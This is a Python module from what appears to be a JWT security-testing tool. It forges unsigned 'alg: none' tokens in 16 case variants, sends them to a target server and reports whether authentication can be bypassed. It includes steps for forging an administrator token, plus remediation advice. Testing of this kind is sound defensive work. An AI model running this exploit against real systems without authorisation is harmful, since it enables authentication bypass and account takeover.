"""Attack 2: alg:none. The server accepts an unsigned token.

A JWT header can declare "alg": "none", meaning the token has no signature. A server that honors
it trusts a token with an empty signature, letting an attacker rewrite the payload freely. Filters
that block "none" are often case-sensitive, so every upper/lower-case variant is tried (16 total).
"""

import itertools

from jwtpen.core.jwt_utils import decode, encode, construct_jwt
from jwtpen.core.raw_request import parse_request, swap_token
from jwtpen.core.checker import send, classify, resembles, ACCEPTED
from jwtpen.attacks.base import Finding, VULNERABLE, NOT_VULNERABLE, INCONCLUSIVE, HIGH


def forge_variants(token):
    """Return a list of (alg_value, forged_token) candidates for the alg:none attack.

    For each case variant of "none", the token is rebuilt with that alg and an empty signature
    ("header.payload."), leaving the payload unchanged.
    """
    header, payload, _ = decode(token)

    variants = []
    # Every lower/upper-case combination of the four letters: 2**4 = 16 spellings of "none".
    for combo in itertools.product(*[(c.lower(), c.upper()) for c in "none"]):
        alg = "".join(combo)
        header["alg"] = alg
        signing_input = encode(header, payload)
        forged = construct_jwt(signing_input, "")   # empty signature -> "header.payload."
        variants.append((alg, forged))

    return variants


# NAME and DESCRIPTION are the single source of truth for how this check is labelled; the registry
# reads them so the UI, report and engine never drift apart.
NAME = "Unsigned Token Accepted (alg: none)"
DESCRIPTION = "Checks whether the server accepts a token with no signature and its algorithm set to none."

_SUMMARY = {
    VULNERABLE: ('The server accepted a token that declared "alg": "none" with an empty '
                 "signature. Because unsigned tokens are trusted, an attacker can forge any "
                 "token and bypass authentication entirely."),
    NOT_VULNERABLE: ('The server rejected every "alg": "none" token with an empty signature, '
                     "which indicates unsigned tokens are not accepted."),
    INCONCLUSIVE: ("The result could not be judged automatically: the endpoint responded the "
                   "same way with and without a valid token, so accepted and rejected tokens "
                   "could not be told apart."),
}

_REPRODUCTION = [
    "Log in and capture your session JWT from the request.",
    "Decode it, set the header's \"alg\" to \"none\" (if that is filtered, also try None, NONE, nOnE and other casings), and remove the signature, keeping the trailing dot so the token ends as \"header.payload.\".",
    "Resend the request with this unsigned token. If you remain logged in, the server accepts unsigned tokens. That is the vulnerability.",
    'To demonstrate impact, now also edit a claim in the payload, for example change "sub" to an administrator, and resend.',
    "If the server grants that account's access, you have forged a privileged token with no signature. Re-test other authenticated endpoints too, since this can differ per route.",
]

_REMEDIATION = (
    'Reject the "none" algorithm outright. Verify every token against an explicit allow-list of '
    "strong algorithms (for example RS256 or ES256) and never derive the verification algorithm "
    'from the token\'s own "alg" header. Prefer a maintained library that rejects unsigned tokens '
    "by default."
)

_REFERENCES = [
    {"label": "OWASP Top 10: Identification and Authentication Failures",
     "url": "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/"},
    {"label": "RFC 7519: JSON Web Token (JWT)",
     "url": "https://datatracker.ietf.org/doc/html/rfc7519"},
]


def run(raw_request, token, scheme, options=None):
    """Run the alg:none check end to end and return a Finding (no options used).

    Baselines are sent once, then each of the 16 unsigned "none" variants is sent in turn; the
    first one the server accepts proves the vulnerability and records which spelling bypassed any
    filter.
    """
    parsed = parse_request(raw_request)
    good = send(parsed, scheme)
    bad = send(parse_request(swap_token(raw_request, token, "INVALID")), scheme)
    url = scheme + "://" + parsed["headers"]["Host"] + parsed["path"]

    variants = forge_variants(token)

    accepted_alg = None
    accepted_token = None
    forged = None

    if resembles(good, bad):
        status = INCONCLUSIVE
    else:
        for alg, forged_token in variants:
            response = send(parse_request(swap_token(raw_request, token, forged_token)), scheme)
            if classify(good, bad, response) == ACCEPTED:
                accepted_alg, accepted_token, forged = alg, forged_token, response
                break
        status = VULNERABLE if accepted_alg is not None else NOT_VULNERABLE

    methodology = [
        'Set the token\'s header algorithm to "none" and removed its signature, keeping the trailing dot.',
        "Resent your original request with this unsigned token.",
    ]
    if forged is not None:
        methodology.append(
            f'The server accepted it (using the spelling "{accepted_alg}"), so unsigned tokens are trusted.'
        )
    elif status == NOT_VULNERABLE:
        methodology.append("The server rejected every spelling of \"none\", so unsigned tokens are not accepted.")
    else:
        methodology.append("The endpoint responded the same way with and without a valid token, so the result could not be judged automatically.")

    evidence = {
        "Target URL": url,
        "Expected Response (Valid Token)": f"HTTP {good.status_code}",
    }
    if forged is not None:
        evidence["Received Response (Forged Token)"] = f"HTTP {forged.status_code}"
        evidence["Accepted Variant"] = f'alg = "{accepted_alg}"'
        evidence["Forged Token"] = accepted_token

    return Finding(
        attack=NAME,
        status=status,
        severity=HIGH,
        summary=_SUMMARY[status],
        methodology=methodology,
        reproduction=_REPRODUCTION,
        evidence=evidence,
        remediation=_REMEDIATION,
        references=_REFERENCES,
    )
